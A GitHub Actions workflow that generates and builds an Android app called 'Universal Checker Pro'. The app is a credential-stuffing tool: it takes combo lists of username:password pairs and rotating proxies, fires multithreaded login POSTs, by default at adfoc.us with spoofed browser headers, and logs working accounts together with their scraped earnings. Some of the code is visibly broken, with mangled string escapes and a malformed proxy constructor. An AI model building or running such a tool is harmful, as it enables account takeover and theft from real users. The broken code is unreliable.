name: Build APK

on: workflow_dispatch

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: "8.7"

      - name: Generate project
        run: |
          mkdir -p app/src/main/java/com/stb/iptv                    app/src/main/res/values app/src/main/res/drawable

          cat > settings.gradle.kts <<'XEOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "StalkerIPTV"
          include(":app")
          XEOF

          cat > build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application") version "8.5.2" apply false
              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
          }
          XEOF

          cat > gradle.properties <<'XEOF'
          org.gradle.jvmargs=-Xmx4096m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          android.nonTransitiveRClass=true
          XEOF

          cat > app/build.gradle.kts <<'XEOF'
          plugins {
              id("com.android.application")
              id("org.jetbrains.kotlin.android")
          }
          android {
              namespace = "com.stb.iptv"
              compileSdk = 34
              defaultConfig {
                  applicationId = "com.stb.iptv"
                  minSdk = 24
                  targetSdk = 34
                  versionCode = 3
                  versionName = "3.0"
              }
              buildTypes { release { isMinifyEnabled = false } }
              compileOptions {
                  sourceCompatibility = JavaVersion.VERSION_17
                  targetCompatibility = JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = "17" }
              buildFeatures { compose = true }
              composeOptions { kotlinCompilerExtensionVersion = "1.5.14" }
          }
          dependencies {
              implementation("androidx.core:core-ktx:1.13.1")
              implementation("androidx.activity:activity-compose:1.9.0")
              implementation(platform("androidx.compose:compose-bom:2024.06.00"))
              implementation("androidx.compose.ui:ui")
              implementation("androidx.compose.material3:material3")
              implementation("com.squareup.okhttp3:okhttp:4.12.0")
              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
          }
          XEOF

          cat > app/src/main/AndroidManifest.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
              <application
                  android:label="Universal Checker Pro"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.App">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          XEOF

          cat > app/src/main/res/values/themes.xml <<'XEOF'
          <resources>
              <style name="Theme.App" parent="android:Theme.Material.NoActionBar">
                  <item name="android:windowBackground">#0B1020</item>
                  <item name="android:statusBarColor">#0B1020</item>
                  <item name="android:windowLightStatusBar">false</item>
              </style>
          </resources>
          XEOF

          cat > app/src/main/res/drawable/bg.xml <<'XEOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <gradient android:angle="270" android:startColor="#0B1020"
                  android:centerColor="#101A33" android:endColor="#0B1020" />
          </shape>
          XEOF

          cat > app/src/main/java/com/stb/iptv/CheckerEngine.kt <<'XEOF'
          package com.stb.iptv

          import okhttp3.*
          import okhttp3.MediaType.Companion.toMediaTypeOrNull
          import okhttp3.RequestBody.Companion.toRequestBody
          import java.io.IOException
          import java.net.InetSocketAddress
          import java.net.Proxy
          import java.util.concurrent.ConcurrentLinkedQueue
          import java.util.concurrent.CountDownLatch
          import java.util.concurrent.TimeUnit

          data class Config(
              val name: String = "",
              val getUrl: String = "",
              val postUrl: String = "",
              val successKey: String = "",
              val failureKey: String = "",
              val capToday: Pair<String, String>? = null,
              val capMonth: Pair<String, String>? = null,
              val capTotal: Pair<String, String>? = null,
              val capClicks: Pair<String, String>? = null
          )

          data class LogEntry(
              val text: String,
              val type: LogType
          )

          enum class LogType { VALID, BAD, INFO }

          object CheckerEngine {
              private val baseClient = OkHttpClient.Builder()
                  .connectTimeout(10, TimeUnit.SECONDS)
                  .readTimeout(10, TimeUnit.SECONDS)
                  .followRedirects(true)
                  .followSslRedirects(true)
                  .build()

              fun parseConfig(raw: String): Config {
                  var name = "Custom"
                  var getUrl = ""
                  var postUrl = ""
                  var successKey = ""
                  var failureKey = ""
                  var capToday: Pair<String, String>? = null
                  var capMonth: Pair<String, String>? = null
                  var capTotal: Pair<String, String>? = null
                  var capClicks: Pair<String, String>? = null

                  val lines = raw.lines()
                  for (line in lines) {
                      val trimmed = line.trim()
                      if (trimmed.startsWith(""Name":")) {
                          name = trimmed.substringAfter(""Name":").trim().trim('"', ',')
                      }
                      if (trimmed.contains("REQUEST GET")) {
                          getUrl = trimmed.substringAfter("REQUEST GET").trim().trim('"').substringBefore(""")
                      }
                      if (trimmed.contains("REQUEST POST")) {
                          postUrl = trimmed.substringAfter("REQUEST POST").trim().trim('"').substringBefore(""")
                      }
                      if (trimmed.startsWith("KEY ") && successKey.isEmpty() && !trimmed.contains("EXISTING")) {
                          successKey = trimmed.substringAfter("KEY ").trim().trim('"')
                      }
                      if (trimmed.startsWith("KEY ") && trimmed.contains("EXISTING")) {
                          failureKey = trimmed.substringAfter("KEY ").trim().trim('"')
                      }
                      if (trimmed.contains("Capture_Today's_Earnings")) {
                          val left = trimmed.substringAfter("LR "").substringBefore(""")
                          val right = trimmed.substringAfter(left).substringAfter("" "").substringBefore(""")
                          capToday = Pair(left, right)
                      }
                      if (trimmed.contains("Capture_Month's_Earnings")) {
                          val left = trimmed.substringAfter("LR "").substringBefore(""")
                          val right = trimmed.substringAfter(left).substringAfter("" "").substringBefore(""")
                          capMonth = Pair(left, right)
                      }
                      if (trimmed.contains("Capture_Total_Earnings")) {
                          val left = trimmed.substringAfter("LR "").substringBefore(""")
                          val right = trimmed.substringAfter(left).substringAfter("" "").substringBefore(""")
                          capTotal = Pair(left, right)
                      }
                      if (trimmed.contains("Capture_Total_Clicks")) {
                          val left = trimmed.substringAfter("LR "").substringBefore(""")
                          val right = trimmed.substringAfter(left).substringAfter("" "").substringBefore(""")
                          capClicks = Pair(left, right)
                      }
                  }
                  
                  if(getUrl.isEmpty()) getUrl = "https://adfoc.us/session/create"
                  if(postUrl.isEmpty()) postUrl = "https://adfoc.us/session/create"
                  if(successKey.isEmpty()) successKey = "/session/destroy"
                  if(failureKey.isEmpty()) failureKey = "EXISTING USERS, LOGIN"
                  
                  return Config(name, getUrl, postUrl, successKey, failureKey, capToday, capMonth, capTotal, capClicks)
              }

              private fun parseLeftRight(source: String, left: String, right: String): String {
                  return try {
                      if (!source.contains(left)) return ""
                      val startIndex = source.indexOf(left) + left.length
                      val endIndex = source.indexOf(right, startIndex)
                      if (endIndex == -1) return ""
                      source.substring(startIndex, endIndex).trim()
                  } catch (_: Exception) { "" }
              }

              fun startScan(
                  config: Config,
                  combos: List<String>,
                  proxies: List<String>,
                  threadsCount: Int,
                  onLog: (LogEntry) -> Unit,
                  onProgress: (Int, Int, Int) -> Unit,
                  onDone: () -> Unit
              ) {
                  val comboQueue = ConcurrentLinkedQueue(combos)
                  val proxyQueue = ConcurrentLinkedQueue(proxies)
                  val total = combos.size
                  var validCount = 0
                  var badCount = 0
                  
                  val latch = CountDownLatch(threadsCount)
                  
                  repeat(threadsCount) {
                      Thread {
                          val cookieJar = object : CookieJar {
                              private val cache = mutableListOf<Cookie>()
                              override fun saveFromResponse(url: HttpUrl, cookies: List<Cookie>) { cache.addAll(cookies) }
                              override fun loadForRequest(url: HttpUrl): List<Cookie> = cache
                          }

                          while (true) {
                              val account = comboQueue.poll() ?: break
                              if (!account.contains(":")) {
                                  badCount++
                                  onProgress(validCount, badCount, total)
                                  continue
                              }
                              val user = account.substringBefore(":")
                              val pass = account.substringAfter(":")

                              var client = baseClient.newBuilder().cookieJar(cookieJar).build()
                              
                              val prxStr = proxyQueue.poll()
                              if (prxStr != null) {
                                  proxyQueue.add(prxStr) 
                                  try {
                                      val parts = prxStr.split(":")
                                      if (parts.size >= 2) {
                                          val proxy = Proxy(Proxy.Type.HTTP, InetSocketAddress(parts, parts.toInt()))
                                          client = client.newBuilder().proxy(proxy).build()
                                      }
                                  } catch (_: Exception) {}
                              }

                              try {
                                  val getReq = Request.Builder()
                                      .url(config.getUrl)
                                      .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                                      .build()
                                  client.newCall(getReq).execute().close()

                                  val bodyStr = "email=$user&password=$pass"
                                  val contentType = "application/x-www-form-urlencoded".toMediaTypeOrNull()
                                  val requestBody = bodyStr.toRequestBody(contentType)
                                  
                                  val postReq = Request.Builder()
                                      .url(config.postUrl)
                                      .post(requestBody)
                                      .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                                      .header("Referer", "https://adfoc.us/")
                                      .build()

                                  client.newCall(postReq).execute().use { resp ->
                                      val html = resp.body?.string().orEmpty()
                                      if (html.contains(config.successKey)) {
                                          validCount++
                                          var capStr = ""
                                          config.capToday?.let { capStr += " | Today: " + parseLeftRight(html, it.first, it.second) }
                                          config.capMonth?.let { capStr += " | Month: " + parseLeftRight(html, it.first, it.second) }
                                          config.capTotal?.let { capStr += " | Total: " + parseLeftRight(html, it.first, it.second) }
                                          config.capClicks?.let { capStr += " | Clicks: " + parseLeftRight(html, it.first, it.second) }
                                          
                                          if(capStr.isEmpty() && html.contains("Today's Earnings")) {
                                              val t = parseLeftRight(html, " <strong>Today's Earnings:</strong> ", "&nbsp;&nbsp;&nbsp;<strong>")
                                              val m = parseLeftRight(html, "This Month's Earnings:</strong> ", "&nbsp;&nbsp;&nbsp;")
                                              capStr = " | Today: $t | Month: $m"
                                          }
                                          onLog(LogEntry("VALID: $user:$pass$capStr", LogType.VALID))
                                      } else {
                                          badCount++
                                          onLog(LogEntry("BAD: $user:$pass", LogType.BAD))
                                      }
                                  }
                              } catch (e: Exception) {
                                  badCount++
                                  onLog(LogEntry("BAD: $user:$pass (Error: ${e.message})", LogType.BAD))
                              }
                              onProgress(validCount, badCount, total)
                          }
                          latch.countDown()
                      }.start()
                  }
                  Thread {
                      latch.await()
                      onDone()
                  }.start()
              }
          }
          XEOF

          cat > app/src/main/java/com/stb/iptv/MainActivity.kt <<'XEOF'
          package com.stb.iptv

          import android.content.Context
          import android.net.Uri
          import android.os.Bundle
          import androidx.activity.ComponentActivity
          import androidx.activity.compose.rememberLauncherForActivityResult
          import androidx.activity.compose.setContent
          import androidx.activity.result.contract.ActivityResultContracts
          import androidx.compose.foundation.background
          import androidx.compose.foundation.layout.*
          import androidx.compose.foundation.lazy.LazyColumn
          import androidx.compose.foundation.lazy.items
          import androidx.compose.material3.*
          import androidx.compose.runtime.*
          import androidx.compose.ui.Alignment
          import androidx.compose.ui.Modifier
          import androidx.compose.ui.graphics.Brush
          import androidx.compose.ui.graphics.Color
          import androidx.compose.ui.platform.LocalContext
          import androidx.compose.ui.unit.dp
          import kotlinx.coroutines.Dispatchers
          import kotlinx.coroutines.launch
          import java.io.BufferedReader
          import java.io.InputStreamReader

          val Bg1 = Color(0xFF0B1020)
          val Bg2 = Color(0xFF101A33)
          val GreenValid = Color(0xFF22C55E)
          val RedBad = Color(0xFFEF4444)
          val InfoBlue = Color(0xFF3B82F6)

          class MainActivity : ComponentActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContent {
                      MaterialTheme(colorScheme = darkColorScheme(
                          primary = InfoBlue, background = Bg1, surface = Bg1)) {
                          Surface(Modifier.fillMaxSize()) {
                              Column(Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(Bg1, Bg2, Bg1)))) {
                                  MainScreen()
                              }
                          }
                      }
                  }
              }
          }

          @Composable
          fun MainScreen() {
              val ctx = LocalContext.current
              val scope = rememberCoroutineScope()

              var configText by remember { mutableStateOf("") }
              var comboList by remember { mutableStateOf(listOf<String>()) }
              var proxyList by remember { mutableStateOf(listOf<String>()) }
              
              var statusText by remember { mutableStateOf("Ready to import files") }
              var progressText by remember { mutableStateOf("Valids: 0 | Bads: 0 | Total: 0") }
              var logs by remember { mutableStateOf(listOf<LogEntry>()) }
              var isScanning by remember { mutableStateOf(false) }

              val configLauncher = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri ->
                  uri?.let {
                      configText = readTextFromUri(ctx, it)
                      statusText = "Config Uploaded Successfully"
                  }
              }

              val comboLauncher = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri ->
                  uri?.let {
                      val raw = readTextFromUri(ctx, it)
                      comboList = raw.lines().map { l -> l.trim() }.filter { l -> l.isNotEmpty() }
                      statusText = "Combo Loaded: ${comboList.size} entries"
                      progressText = "Valids: 0 | Bads: 0 | Total: ${comboList.size}"
                  }
              }

              val proxyLauncher = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri ->
                  uri?.let {
                      val raw = readTextFromUri(ctx, it)
                      proxyList = raw.lines().map { l -> l.trim() }.filter { l -> l.isNotEmpty() }
                      statusText = "Proxies Loaded: ${proxyList.size} entries"
                  }
              }

              Column(Modifier.fillMaxSize().padding(14.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                  Text("Universal Account Checker Pro", style = MaterialTheme.typography.headlineSmall, color = InfoBlue)
                  
                  Card(modifier = Modifier.fillMaxWidth()) {
                      Column(Modifier.padding(10.dp)) {
                          Text(statusText, style = MaterialTheme.typography.bodyMedium, color = Color.White)
                          Text(progressText, style = MaterialTheme.typography.bodySmall, color = Color.Gray)
                      }
                  }

                  Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                      Button(onClick = { configLauncher.launch("*/*") }, modifier = Modifier.weight(1f), enabled = !isScanning) {
                          Text("Upload Config")
                      }
                      Button(onClick = { comboLauncher.launch("*/*") }, modifier = Modifier.weight(1f), enabled = !isScanning) {
                          Text("Upload Combo")
                      }
                      Button(onClick = { proxyLauncher.launch("*/*") }, modifier = Modifier.weight(1f), enabled = !isScanning) {
                          Text("Upload Proxy")
                      }
                  }

                  Button(
                      onClick = {
                          isScanning = true
                          logs = emptyList()
                          val parsedConfig = CheckerEngine.parseConfig(configText)
                          statusText = "Running Engine: ${parsedConfig.name}"
                          
                          scope.launch(Dispatchers.Default) {
                              CheckerEngine.startScan(
                                  config = parsedConfig,
                                  combos = comboList,
                                  proxies = proxyList,
                                  threadsCount = 10,
                                  onLog = { logItem ->
                                      scope.launch { logs = listOf(logItem) + logs }
                                  },
                                  onProgress = { v, b, total ->
                                      scope.launch { progressText = "Valids: $v | Bads: $b | Total: $total" }
                                  },
                                  onDone = {
                                      scope.launch {
                                          isScanning = false
                                          statusText = "Scan Process Completed"
                                      }
                                  }
                              )
                          }
                      },
                      modifier = Modifier.fillMaxWidth(),
                      colors = ButtonDefaults.buttonColors(containerColor = GreenValid),
                      enabled = !isScanning && comboList.isNotEmpty()
                  ) {
                      Text("START CHECKER", color = Color.Black)
                  }

                  Text("Live Output Logs:", style = MaterialTheme.typography.labelMedium, color = Color.Gray)

                  LazyColumn(
                      modifier = Modifier.weight(1f).fillMaxWidth().background(Color(0xFF070B14)).padding(6.dp),
                      verticalArrangement = Arrangement.spacedBy(4.dp)
                  ) {
                      items(logs) { log ->
                          val color = when (log.type) {
                              LogType.VALID -> GreenValid
                              LogType.BAD -> RedBad
                              LogType.INFO -> InfoBlue
                          }
                          Text(log.text, color = color, style = MaterialTheme.typography.bodySmall)
                      }
                  }
              }
          }

          fun readTextFromUri(context: Context, uri: Uri): String {
              val sb = StringBuilder()
              try {
                  context.contentResolver.openInputStream(uri)?.use { inputStream ->
                      BufferedReader(InputStreamReader(inputStream)).use { reader ->
                          var line: String?
                          while (reader.readLine().also { line = it } != null) {
                              sb.append(line).append("
")
                          }
                      }
                  }
              } catch (_: Exception) {}
              return sb.toString()
          }
          XEOF

          echo "project generated"

      - name: Build debug APK
        run: gradle --no-daemon assembleDebug

      - uses: actions/upload-artifact@v4
        with:
          name: stalker-iptv-apk
          path: app/build/outputs/apk/debug/app-debug.apk